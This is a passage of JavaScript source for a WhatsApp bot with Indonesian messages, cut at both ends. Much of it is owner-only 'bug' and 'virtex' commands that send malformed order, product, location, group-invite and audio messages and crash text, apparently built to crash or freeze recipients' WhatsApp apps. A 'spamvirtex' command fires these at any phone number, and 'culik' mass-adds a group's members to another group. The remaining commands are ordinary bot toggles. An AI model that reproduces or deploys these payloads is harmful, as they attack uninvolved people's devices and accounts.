"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": virgam,
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}, {
contextInfo: forward
});
xdev.relayWAMessage(kirin)
}
break
 
 
 
 
	
	
case 'amaterasu':
if(isExtream) return
if (!isOwner) return onlyOwner()
{
var kirim = xdev.prepareMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': virgam,
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message': philip(prefix),
'orderTitle': fake,
'sellerJid': `0@s.whatsapp.net`,
'token': 'ydkskyshj755hfuej',
}
}, {
contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
});
xdev.relayWAMessage(kirim)
                 
                 
                 
xdev.sendMessage(from, virtex8(prefix), text,  {
'quoted': {
'key': {
'fromMe': false,
'participant': `0@s.whatsapp.net`,
'remoteJid': "0@s.whatsapp.net"
},
'message': {
'orderMessage': {
'itemCount': jumlahTroli,
'status': 1,
'surface': 1,
'message': 'NOPE',
'orderTitle': 'halo gaes',
'thumbnail': virgam,
'sellerJid': "0@s.whatsapp.net"
}
}
},
'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
})
                
                
xdev.sendMessage(from, {
'groupName': virtex8(prefix),
'groupJid': '6285156137901-1627579259@g.us',
'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
'inviteExpiration': '0',
'caption': virtex7(prefix),
'jpegThumbnail': davizin,
}, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
})        
                
                
xdev.sendMessage(from, {
degreesLatitude: 36.036105801662316,
degreesLongitude: 138.09072320256624,
name: virtex7(prefix),
address: virtex6(prefix),
jpegThumbnail: virgam,
}, location,
{contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
hmm4 = fs.readFileSync('./stik/fake.jpeg'),
imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
imeg = imeu.message.imageMessage
res = await xdev.prepareMessageFromContent(from, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': '',
'title': virtex8(prefix),
'description': virtex8(prefix),
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `0@s.whatsapp.net`,
'contextInfo': {
'forwardingScore': 100000000,
'isForwarded': true,
'sendEphemeral': true
}
}
}, {
contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
}), 
xdev.relayWAMessage(res)
                             
                             
                             
                    
const nana = fs.readFileSync('./stik/trava.jpg');
xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        

var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await xdev.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': davizin,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break
           
           case 'bugv1':
                if(isExtream) return
         if (!isOwner) return onlyOwner()
              {
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)

                }
                break;
                
             
                case 'bugv2':
                     if(isExtream) return
            if (!isOwner) return onlyOwner()
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                
                
                case 'bugv3':
                     if(isExtream) return
                   if (!isOwner) return onlyOwner()
                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '🔥',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': 'bug',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': thumb,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': davizin,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
                
           case 'bugv4':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
                    if(isGroup) return setReply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
           case 'bugv5':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
              
               hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  xdev.relayWAMessage(res)
                
                    }
                    break;
    
           case 'bugvn':
           if(isExtream) return
                    if (!isOwner) return onlyOwner()
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                xdev.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;

  case 'virtex':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
           setReply('*Loading...*')
               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
               await xdev.sendMessage(from, virtex(prefix), text)            
                await xdev.sendMessage(from, virtex2(prefix), text)       
                 await xdev.sendMessage(from, virtex3(prefix), text)    
                await xdev.sendMessage(from, virtex4(prefix), text)              
                await xdev.sendMessage(from, virtex5(prefix), text)     
                await xdev.sendMessage(from, virtex6(prefix), text)
                await xdev.sendMessage(from, virtex7(prefix), text)   
                await xdev.sendMessage(from, virtex8(prefix), text)            
                await xdev.sendMessage(from, virtex9(prefix), text)       
                 await xdev.sendMessage(from, virtex10(prefix), text)    
                await xdev.sendMessage(from, virtex11(prefix), text)              
                await xdev.sendMessage(from, virtex12(prefix), text)     
                await xdev.sendMessage(from, philip(prefix), text)
                 await xdev.sendMessage(from, slayer(prefix), text) 
                 await xdev.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
          
           
           case 'spamvirtex':    
              //  if(isExtream) return
                   if (!isOwner) return onlyOwner()
                     try {                 
                     setReply('*Loading...*')
                    if (args.length < 1) return setReply(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
			       woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
					var nilaiAwal = 1;
                    while(nilaiAwal <= 3) { 
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : dev})
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
      
           
           

           
           
           
           
           
           
           
           
           
           
           
           
//-------------------------------》FITUR OWNER《-------------------------------\\     
           

             
        
                
        
        
        
        
        case 'antibuggc':
                    if(!isGroup) return setReply("Hanya bisa di group")
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (Antibuggc) return setReply('Sudah aktif kak')
                    addDataId(from, command, DataId)
                    setReply("Sukses mengaktifkan antibuggc di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!Antibuggc) return setReply('Sudah Mati')
                    removeDataId (command, from, DataId)
                    setReply("Sukses mematikan antibuggc!");
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibuggc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibuggc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 

                 
                 
                 
                 
                 
                 case 'settingmenu':
                  if(!isGroup) return setReply("*Hanya Bisa Di Group!!*")
                    if(isExtream) return
			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (checkDataId ("settingmenu", from, DataId) ) return setReply('Sudah aktif kak')
                    addDataId(from, command, DataId)
                    setReply("*Fitur Allmenu Telah Di Aktifkan*\n*Kirim Perintah .allmenu Untuk Melihat Command!!*")
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!checkDataId ("settingmenu", from, DataId) ) return setReply('Sudah Mati')
                    removeDataId (command, from, DataId)
                    setReply("*Fitur Allmenu Telah Di Matikan!!*")
					} else if (!q) {
                      sendButMessage(from, `*──❒ SETTING ALLMENU ❒──*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}settingmenu on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}settingmenu off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
        
                 
           
           case 'antitroli':
            if(!isGroup) return setReply("Hanya bisa di group")
                    if(isExtream) return
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (antibugtroli === true) return setReply('Sudah aktif kak')
                    antibugtroli = true
                    let ah =`Mode anti bugtroli aktif kak`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (antibugtroli === false) return setReply('Udah off kak')
                     antibugtroli = false
                     let uh =`Mode anti bugtroli di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
                      
           
           
           
                 
                 
                 case 'forward':
					       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (forwarding === true) return setReply('Udah aktif kak')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (forwarding === false) return setReply('Udah off kak')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
     
	
	
           
           

					
					

					
					
					
					
					case 'bcgc':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('g.us'))
					let yesnih = [{"buttonId": `${prefix}owner`,"buttonText": {"displayText": `ᴏᴡɴᴇʀ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					    } else {
						for (let _ of anus) {
							
					    await sendBc(_.jid, `⸢ *BROADCAST GROUP* ⸥\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), yesnih)
						} 
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					    }
					   break
					
		   case 'culik':
            if (!isOwner && !itsMe) return setReply(mess.only.ownerB)
            if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
            let pantek = []
            for (let i of groupMembers) {
                pantek.push(i.jid)
            }
            xdev.groupAdd(args[0], pantek)
            break
					

           
           
			case 'autowelcome':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoWelcome === true) return setReply('Udah aktif kak')
                    autoWelcome = true           
                    let ih =`Mode auto welcome telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoWelcome === false) return setReply('Udah off kak')
                     autoWelcome = false         
                     let eh =`Mode auto welcome telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autowelcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autowelcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;			
			
			
			

			
			
			
           
           
           case 'autoread':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoread === true) return setReply('Udah aktif kak')
                    autoread = true
                    autoreadgc = false
                    autoreadpc = false
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoread === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                    autoreadpc = false
                     let eh =`Mode auto read telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoreadgc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadgc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadgc = true
                    let ih =`Mode auto read gc telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadgc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                     let eh =`Mode auto read gc telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD GC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autoreadpc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadpc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadpc = true
                    let ih =`Mode auto read telah pc aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadpc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadpc = false
                     let eh =`Mode auto read telah pc di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD PC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadpc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadpc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
     

     
                                                   
                                                
                 
                 
                 
                 
					
					
					case 'autovn':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autovn === true) return setReply('Udah aktif kak')
                    autovn = true
                    typing = false
                    autosticker = false
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autovn === false) return setReply('Udah off kak')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autosticker':
				    if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autosticker === true) return setReply('Udah aktif kak')
                    autosticker = true
                    autovn = false
                    typing = false
                    let ih =`Mode autosticker telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autosticker === false) return setReply('Udah off kak')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
					
                 case 'autotyping':
					case 'typing':
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (typing === true) return setReply('Udah aktif kak')
                    typing = true
                    autovn = false
                    autosticker = false
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (typing === false) return setReply('Udah off kak')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoblockcmd':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autoblockcmd === true) return setReply('Udah aktif kak')
                    autoblockcmd = true          
                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoblockcmd === false) return setReply('Udah off kak')
                     autoblockcmd = false
                     let eh =`Mode auto block command telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 case 'autobio':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autobio) return setReply('Udah aktif kak')
                    autobio = true          
                    let ih =`Mode auto bio telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autobio) return setReply('Udah off kak')
                     autobio = false
                     let eh =`Mode auto bio telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
           
      case 'unblockcmd':
      case 'delblock':
      case 'delblockcmd':
      try{
    	  if (!isOwner) return onlyOwner()
          if(!q) return setReply("Textnya mana cih")
          if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
          deleteblockcmd(q, listcmdblock)        
          setReply(`Berhasil unblock command 「 *${q}* 」`)
          } catch (err) {
          	setReply("Bjirr error, keknya ada yang error")
          }
      break  
            
            case 'blockcmd':{
          if (!isOwner) return onlyOwner()
          if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
          if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
          addblockcmd(q,listcmdblock) 
          setTimeout( () => {
          setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)
           },3000)
          }
      break
            
            
            
            
                  
           case 'listblockcmd':
           case 'listcmdblock':
if (!isOwner) return onlyOwner()
let wo = `⸢ *LIST BLOCK CMD* ⸥`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
mentions(wo, soso, true)
break




           
      


 
           


        

	




           
                    

			
			
			
			
			            
           
case 'public':
               if (!isOwner) return onlyOwner()

           if (publik === true) return setReply('Udah di mode publick kak')
           publik = true
           let bab =`Mode public aktif kak`
           xdev.sendMessage(from, bab, text, { quoted: setQuoted, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return onlyOwner()

           if (publik === false) return setReply('Udah di mode self kak')
           publik = false
           let breh =`Mode self aktif kak`
           xdev.sendMessage(from, breh, text, { quoted: setQuoted, contextInfo: forward})
           break
           
           
case 'sendbug':
